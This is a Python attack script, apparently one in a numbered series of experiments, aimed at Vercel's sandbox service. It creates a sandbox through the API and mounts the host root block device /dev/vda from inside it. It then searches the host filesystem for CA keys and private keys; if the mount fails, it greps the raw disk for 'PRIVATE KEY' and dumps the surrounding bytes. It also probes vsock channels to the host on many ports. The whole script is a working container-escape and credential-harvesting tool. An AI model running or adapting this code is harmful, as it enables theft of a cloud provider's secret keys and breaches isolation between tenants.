# 实验J141: 宿主根块设备 vda 只读挂载 + 私钥猎取 + vsock 通道探测
# 前提: j140 确认 /dev/vda (254:0, 17.7GB) 存在且 mountinfo 显示宿主根 = /dev/root = vda
#       j139 确认 mount 系统调用可用(CAP_SYS_ADMIN) + 全 caps + 同 mount ns
# 方法: API cmd 直连(无需攻击链) -> open /dev/vda -> mount -o ro,nouuid,norecovery
#       -> 宿主 fs 内 find ca-key/私钥; 挂载失败则原始块 grep 兜底; 附加 vsock 探测
# 零破坏: 只读挂载(MS_RDONLY=1), 绝不写宿主设备
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=300):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    for attempt in range(6):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        time.sleep(4)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)
    return ""

NAME = "expj141"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME,
            "networkPolicy": {"mode": "custom", "allowedDomains": ["httpbin.org"]}})
print("create:", c)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid)

PROBE = r"""
import os, subprocess, socket, time, ctypes, struct
out = open("/tmp/d141.txt", "w")
def p(*a):
    out.write(" ".join(str(x) for x in a) + "\n")
    out.flush()
def sh(cmd, t=15):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, timeout=t)
        return (r.stdout or b"").decode("latin1", "replace") + (r.stderr or b"").decode("latin1", "replace")
    except Exception as e:
        return "EXC %r" % (e,)

p("=== VDA_OPEN ===")
try:
    f = open("/dev/vda", "rb")
    hdr = f.read(4096)
    f.close()
    magic = hdr[:4]
    bs = struct.unpack_from(">I", hdr, 4)[0] if magic == b"XFSB" else 0
    p("read ok len", len(hdr), "magic", magic, "blocksize", bs)
except Exception as e:
    p("VDA_ERR", repr(e))

libc = ctypes.CDLL(None, use_errno=True)
libc.mount.restype = ctypes.c_int
os.makedirs("/tmp/host", exist_ok=True)
p("=== MOUNT_VDA ===")
ctypes.set_errno(0)
r = libc.mount(b"/dev/vda", b"/tmp/host", b"xfs", 1, b"nouuid,norecovery")
p("mount rc", r, "errno", ctypes.get_errno(), os.strerror(ctypes.get_errno()))
MOUNTED = (r == 0)

if MOUNTED:
    p("=== HOST_ROOT ===")
    p(sh("ls -la /tmp/host/ | head -40"))
    p("=== HOST_RUN ===")
    p(sh("ls -la /tmp/host/run/ 2>&1 | head -30"))
    p("=== HOST_RUN_CELL ===")
    p(sh("ls -la /tmp/host/run/cell/ 2>&1"))
    p("=== HOST_VOLUMES ===")
    p(sh("ls -la /tmp/host/volumes/ 2>&1 | head -30"))
    p("=== FIND_KEY ===")
    p(sh("find /tmp/host/run /tmp/host/etc /tmp/host/root /tmp/host/home /tmp/host/volumes /tmp/host/var /tmp/host/opt /tmp/host/srv -maxdepth 7 \\( -name '*ca-key*' -o -name '*key*.pem' -o -name '*.key' -o -name '*private*' \\) 2>/dev/null | head -80"))
    p("=== FIND_PEM ===")
    p(sh("find /tmp/host -maxdepth 4 -name '*.pem' 2>/dev/null | head -60"))
    p("=== GREP_PRIVKEY ===")
    p(sh("grep -rls 'BEGIN.*PRIVATE KEY' /tmp/host/run /tmp/host/etc /tmp/host/root /tmp/host/home /tmp/host/var /tmp/host/volumes /tmp/host/opt /tmp/host/srv 2>/dev/null | head -30"))
    p("=== CAT_CELL ===")
    p(sh("ls -la /tmp/host/run/cell/ 2>&1; for f in /tmp/host/run/cell/*; do echo --FILE $f; head -c 2000 \"$f\" 2>&1; echo; done", 30))
else:
    p("=== RAW_GREP_KEYNAME ===")
    p(sh("grep -abo 'ca-key' /dev/vda 2>/dev/null | head -20", 120))
    p("=== RAW_GREP_PRIVKEY ===")
    p(sh("grep -abo 'BEGIN[[:space:]]\\{0,2\\}[A-Z0-9 ]\\{0,30\\}PRIVATE KEY' /dev/vda 2>/dev/null | head -20", 180))
    p("=== RAW_CONTEXT ===")
    try:
        hits = sh("grep -abo 'PRIVATE KEY' /dev/vda 2>/dev/null | head -5", 180)
        p(hits)
        for line in hits.splitlines():
            try:
                off = int(line.split(":")[0])
                f = open("/dev/vda", "rb")
                f.seek(max(0, off - 300))
                seg = f.read(700)
                f.close()
                p("OFF", off, repr(seg[:700]))
            except Exception as e:
                p("CTX_ERR", repr(e))
    except Exception as e:
        p("RAW_CTX_ERR", repr(e))

p("=== VSOCK_NET ===")
p(sh("cat /proc/net/vsock 2>&1 | head -30"))
p("=== VSOCK_CONNECT ===")
AF_VSOCK = 40
for cid, port in [(2, 22), (2, 80), (2, 443), (2, 3000), (2, 5000), (2, 8000), (2, 8080), (2, 9000), (2, 2379), (2, 10250), (2, 6443), (2, 1), (2, 9), (3, 22), (3, 443)]:
    try:
        s = socket.socket(AF_VSOCK, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((cid, port))
        p("CONNECT_OK cid=%d port=%d" % (cid, port))
        s.close()
    except Exception as e:
        p("p", port, "cid", cid, "err", repr(e)[:90])
p("=== VSOCK_BIND ===")
try:
    s = socket.socket(AF_VSOCK, socket.SOCK_STREAM)
    s.bind((4294967295, 12345))
    s.listen(1)
    s.settimeout(2)
    p("bind/listen ok")
    try:
        c, a = s.accept()
        p("accept", a)
        c.close()
    except Exception as e:
        p("accept err", repr(e)[:100])
    s.close()
except Exception as e:
    p("bind err", repr(e)[:100])
p("=== DONE")
out.close()
"""

run_cmd(sid, PROBE, "host-mount", timeout=300)
c2, r2 = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}",
             {"command": "cat", "args": ["/tmp/d141.txt"], "wait": True, "logs": True, "timeout": 100})
print(f"=== d141 status {c2} ===", flush=True)
print(r2[:20000], flush=True)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
